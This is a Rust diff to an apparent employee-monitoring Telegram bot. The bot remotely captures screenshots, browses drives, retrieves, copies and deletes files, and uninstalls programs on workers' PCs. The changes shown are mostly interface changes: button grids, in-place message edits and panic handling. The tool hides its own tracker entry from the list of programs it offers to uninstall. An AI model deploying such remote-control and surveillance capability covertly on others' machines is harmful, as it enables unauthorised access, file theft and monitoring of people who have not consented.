@@ -34,7 +34,8 @@ const LIVE_JPEG_WIDTH: u32 = 1920;
 const LIVE_JPEG_QUALITY: u8 = 90;
 const SHOT_DEBOUNCE: Duration = Duration::from_secs(8);
 const SLOT_TTL: Duration = Duration::from_secs(15 * 60);
-const PAGE_SIZE: usize = 8;
+const PAGE_SIZE: usize = 20;
+const GRID_COLS: usize = 2;
 
 static SLOT_SEQ: AtomicU32 = AtomicU32::new(1);
 static REQ_SEQ: AtomicU64 = AtomicU64::new(1);
@@ -125,6 +126,7 @@ enum Job {
         ctx: FsCtx,
         query_id: String,
         data: String,
+        message_id: i64,
     },
     IpcDone {
         req_id: String,
@@ -281,6 +283,7 @@ fn poll_loop(cfg: AppConfig, client: TelegramClient, tx: Sender<AdminCmd>, jobs:
                                     ctx: fs_ctx(&cfg, &u.chat_id),
                                     query_id: qid.clone(),
                                     data: data.clone(),
+                                    message_id: u.message_id,
                                 })
                                 .is_err()
                             {
@@ -288,6 +291,7 @@ fn poll_loop(cfg: AppConfig, client: TelegramClient, tx: Sender<AdminCmd>, jobs:
                             }
                         }
                         state.processed = state.processed.max(u.update_id);
+                        state.confirmed = state.confirmed.max(u.update_id);
                         continue;
                     }
                     match commands::parse_command(&u.text) {
@@ -409,6 +413,13 @@ fn save_offset(state: &OffsetState) {
 
 fn worker_loop(client: TelegramClient, rx: Receiver<Job>, ipc: Sender<IpcMsg>) {
     while let Ok(job) = rx.recv() {
+        let _ = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
+            dispatch_job(&client, &ipc, job);
+        }));
+    }
+}
+
+fn dispatch_job(client: &TelegramClient, ipc: &Sender<IpcMsg>, job: Job) {
         match job {
             Job::Online {
                 chat,
@@ -475,20 +486,20 @@ fn worker_loop(client: TelegramClient, rx: Receiver<Job>, ipc: Sender<IpcMsg>) {
             Job::ShotOnly { chat, employee, pc } => {
                 send_shot_only(&client, &chat, employee, pc);
             }
-            Job::Files { ctx, path } => do_files(&client, &ctx, path.as_deref()),
-            Job::Get { ctx, path } => do_get(&client, &ipc, &ctx, &path),
-            Job::Copy { ctx, src, dest } => do_copy(&client, &ipc, &ctx, &src, &dest),
-            Job::AskDel { ctx, path } => do_ask_del(&client, &ctx, &path),
-            Job::AskUninstall { ctx, display } => do_ask_uninstall(&client, &ctx, &display),
-            Job::Programs { ctx } => do_programs(&client, &ctx),
+            Job::Files { ctx, path } => do_files(client, &ctx, path.as_deref(), None),
+            Job::Get { ctx, path } => do_get(client, ipc, &ctx, &path),
+            Job::Copy { ctx, src, dest } => do_copy(client, ipc, &ctx, &src, &dest),
+            Job::AskDel { ctx, path } => do_ask_del(client, &ctx, &path),
+            Job::AskUninstall { ctx, display } => do_ask_uninstall(client, &ctx, &display),
+            Job::Programs { ctx } => do_programs(client, &ctx, None),
             Job::Callback {
                 ctx,
                 query_id,
                 data,
-            } => do_callback(&client, &ipc, &ctx, &query_id, &data),
-            Job::IpcDone { req_id, ok, detail } => do_ipc_done(&client, req_id, ok, detail),
+                message_id,
+            } => do_callback(client, ipc, &ctx, &query_id, &data, message_id),
+            Job::IpcDone { req_id, ok, detail } => do_ipc_done(client, req_id, ok, detail),
         }
-    }
 }
 
 pub fn handle(session: &mut SessionState, jobs: &JobHandle, cmd: AdminCmd) {
@@ -590,6 +601,7 @@ fn send_log_markup(
     result: &str,
     extra: &str,
     markup: Option<&str>,
+    edit: Option<i64>,
 ) {
     let mut body = messages::admin_work_log(&ctx.employee, &ctx.pc, op, path, result);
     if !extra.is_empty() {
@@ -597,10 +609,18 @@ fn send_log_markup(
         body.push('\n');
         body.push_str(extra);
     }
+    if let Some(mid) = edit.filter(|id| *id != 0) {
+        if client
+            .edit_message_text(&ctx.chat, mid, &body, markup)
+            .is_ok()
+        {
+            return;
+        }
+    }
     let _ = client.send_message_markup(&ctx.chat, &body, markup);
 }
 
-fn do_files(client: &TelegramClient, ctx: &FsCtx, path: Option<&str>) {
+fn do_files(client: &TelegramClient, ctx: &FsCtx, path: Option<&str>, edit: Option<i64>) {
     match path {
         None | Some("") => {
             let drives = admin_fs::list_drives();
@@ -622,13 +642,34 @@ fn do_files(client: &TelegramClient, ctx: &FsCtx, path: Option<&str>) {
             } else {
                 Some(inline_markup(&rows))
             };
-            send_log_markup(client, ctx, "list", "(drives)", "ok", extra, mk.as_deref());
+            send_log_markup(
+                client,
+                ctx,
+                "list",
+                "(drives)",
+                "ok",
+                extra,
+                mk.as_deref(),
+                edit,
+            );
         }
-        Some(p) => send_listing(client, ctx, &admin_fs::normalize_admin_path(p), 0),
+        Some(p) => send_listing(
+            client,
+            ctx,
+            &admin_fs::normalize_admin_path(p),
+            0,
+            edit,
+        ),
     }
 }
 
-fn send_listing(client: &TelegramClient, ctx: &FsCtx, path: &Path, offset: usize) {
+fn send_listing(
+    client: &TelegramClient,
+    ctx: &FsCtx,
+    path: &Path,
+    offset: usize,
+    edit: Option<i64>,
+) {
     match admin_fs::list_dir(path) {
         Ok(list) => {
             let total = list.dirs.len() + list.files.len();
@@ -649,7 +690,16 @@ fn send_listing(client: &TelegramClient, ctx: &FsCtx, path: &Path, offset: usize
             } else {
                 Some(inline_markup(&rows))
             };
-            send_log_markup(client, ctx, "list", &list.path, "ok", &extra, mk.as_deref());
+            send_log_markup(
+                client,
+                ctx,
+                "list",
+                &list.path,
+                "ok",
+                &extra,
+                mk.as_deref(),
+                edit,
+            );
         }
         Err(e) => send_log(
             client,
@@ -693,6 +743,7 @@ fn listing_buttons(list: &admin_fs::DirListing, tag: &str, offset: usize) -> Vec
         rows.push(vec![btn("Delete this folder", &cb_data('d', tag, id))]);
     }
     let start = offset.min(total);
+    let mut items = Vec::new();
     let mut i = 0usize;
     for d in &list.dirs {
         if i < start {
@@ -704,10 +755,7 @@ fn listing_buttons(list: &admin_fs::DirListing, tag: &str, offset: usize) -> Vec
         }
         i += 1;
         let id = alloc_slot(SlotKind::Open(d.clone()));
-        rows.push(vec![btn(
-            &format!("[dir] {}", trunc_name(d)),
-            &cb_data('o', tag, id),
-        )]);
+        items.push(btn(&format!("▸ {}", trunc_name(d)), &cb_data('o', tag, id)));
     }
     for (f, sz) in &list.files {
         if i < start {
@@ -719,12 +767,27 @@ fn listing_buttons(list: &admin_fs::DirListing, tag: &str, offset: usize) -> Vec
         }
         i += 1;
         let id = alloc_slot(SlotKind::FileMenu(f.clone()));
-        rows.push(vec![btn(
-            &format!("[file] {} ({})", trunc_name(f), admin_fs::format_size(*sz)),
+        items.push(btn(
+            &format!("{} ({})", trunc_name(f), admin_fs::format_size(*sz)),
             &cb_data('f', tag, id),
-        )]);
+        ));
     }
+    push_grid(&mut rows, items, GRID_COLS);
     rows
+}
+
+fn push_grid(rows: &mut Vec<Vec<InlineBtn>>, items: Vec<InlineBtn>, cols: usize) {
+    let cols = cols.max(1);
+    let mut row = Vec::new();
+    for b in items {
+        row.push(b);
+        if row.len() == cols {
+            rows.push(std::mem::take(&mut row));
+        }
+    }
+    if !row.is_empty() {
+        rows.push(row);
+    }
 }
 
 fn do_get(client: &TelegramClient, ipc: &Sender<IpcMsg>, ctx: &FsCtx, path: &str) {
@@ -861,6 +924,7 @@ fn do_file_menu(client: &TelegramClient, ctx: &FsCtx, path: &Path) {
         "choose",
         &format!("{name} ({sz})\nTap Get, Delete, or Cancel."),
         Some(&inline_markup(&rows)),
+        None,
     );
 }
 
@@ -886,6 +950,7 @@ fn do_ask_del(client: &TelegramClient, ctx: &FsCtx, path: &str) {
         "confirm",
         "Delete this path?\nTap Yes or No. This cannot be undone.",
         Some(&inline_markup(&rows)),
+        None,
     );
 }
 
@@ -918,11 +983,11 @@ fn do_del(client: &TelegramClient, ipc: &Sender<IpcMsg>, ctx: &FsCtx, path: &str
     }
 }
 
-fn do_programs(client: &TelegramClient, ctx: &FsCtx) {
-    send_programs_page(client, ctx, 0);
+fn do_programs(client: &TelegramClient, ctx: &FsCtx, edit: Option<i64>) {
+    send_programs_page(client, ctx, 0, edit);
 }
 
-fn send_programs_page(client: &TelegramClient, ctx: &FsCtx, offset: usize) {
+fn send_programs_page(client: &TelegramClient, ctx: &FsCtx, offset: usize, edit: Option<i64>) {
     let rows: Vec<_> = admin_fs::list_programs()
         .into_iter()
         .filter(|p| !admin_fs::is_ftracker_program(&p.name))
@@ -949,15 +1014,17 @@ fn send_programs_page(client: &TelegramClient, ctx: &FsCtx, offset: usize) {
     if !nav.is_empty() {
         buttons.push(nav);
     }
+    let mut items = Vec::new();
     for p in rows.iter().skip(offset).take(PAGE_SIZE) {
         let id = alloc_slot(SlotKind::AskUninstall(p.name.clone()));
         let label = if p.publisher.is_empty() {
-            trunc_str(&p.name, 40)
+            trunc_str(&p.name, 22)
         } else {
-            trunc_str(&format!("{} ({})", p.name, p.publisher), 40)
+            trunc_str(&format!("{} ({})", p.name, p.publisher), 22)
         };
-        buttons.push(vec![btn(&label, &cb_data('u', &ctx.tag, id))]);
+        items.push(btn(&label, &cb_data('u', &ctx.tag, id)));
     }
+    push_grid(&mut buttons, items, GRID_COLS);
     let mk = if buttons.is_empty() {
         None
     } else {
@@ -971,6 +1038,7 @@ fn send_programs_page(client: &TelegramClient, ctx: &FsCtx, offset: usize) {
         &format!("ok {total}"),
         &extra,
         mk.as_deref(),
+        edit,
     );
 }
 
@@ -1007,6 +1075,7 @@ fn do_ask_uninstall(client: &TelegramClient, ctx: &FsCtx, display: &str) {
                     "Uninstall this program?{pub_line}\nTap Yes or No. This cannot be undone."
                 ),
                 Some(&inline_markup(&rows)),
+                None,
             );
         }
         Err(e) => send_log(client, ctx, "uninstall", display, e),
@@ -1044,8 +1113,10 @@ fn do_callback(
     ctx: &FsCtx,
     query_id: &str,
     data: &str,
+    message_id: i64,
 ) {
     let Some((op, id)) = parse_cb(data, &ctx.tag) else {
+        let _ = client.answer_callback(query_id, "ignored");
         return;
     };
     let consume = matches!(op, 'y' | 'n' | 'g' | 'x');
@@ -1055,23 +1126,28 @@ fn do_callback(
         peek_slot(id)
     };
     let Some(kind) = kind else {
-        let _ = client.answer_callback(query_id, "expired");
+        let _ = client.answer_callback(query_id, "expired — send files again");
         return;
     };
     let _ = client.answer_callback(query_id, "");
+    let edit = if message_id != 0 {
+        Some(message_id)
+    } else {
+        None
+    };
     match (op, kind) {
         ('o', SlotKind::Open(p)) => {
             if p.as_os_str().is_empty() {
-                do_files(client, ctx, None);
+                do_files(client, ctx, None, edit);
             } else {
-                send_listing(client, ctx, &p, 0);
+                send_listing(client, ctx, &p, 0, edit);
             }
         }
         ('m', SlotKind::PageDir { path, offset }) => {
-            send_listing(client, ctx, &path, offset);
+            send_listing(client, ctx, &path, offset, edit);
         }
         ('k', SlotKind::PagePrograms { offset }) => {
-            send_programs_page(client, ctx, offset);
+            send_programs_page(client, ctx, offset, edit);
         }
         ('f', SlotKind::FileMenu(p)) => do_file_menu(client, ctx, &p),
         ('g', SlotKind::Get(p)) => do_get(client, ipc, ctx, &p.display().to_string()),
@@ -1193,14 +1269,17 @@ fn parse_cb(data: &str, tag: &str) -> Option<(char, u32)> {
 }
 
 fn btn(text: &str, data: &str) -> InlineBtn {
+    let cleaned: String = text.chars().filter(|c| !c.is_control()).collect();
+    let cleaned = cleaned.trim();
+    let label = if cleaned.is_empty() { "?" } else { cleaned };
     InlineBtn {
-        text: trunc_str(text, 40),
+        text: trunc_str(label, 32),
         data: data.to_string(),
     }
 }
 
 fn trunc_name(p: &Path) -> String {
-    trunc_str(&p.file_name().unwrap_or_default().to_string_lossy(), 28)
+    trunc_str(&p.file_name().unwrap_or_default().to_string_lossy(), 18)
 }
 
 fn trunc_str(s: &str, max: usize) -> String {
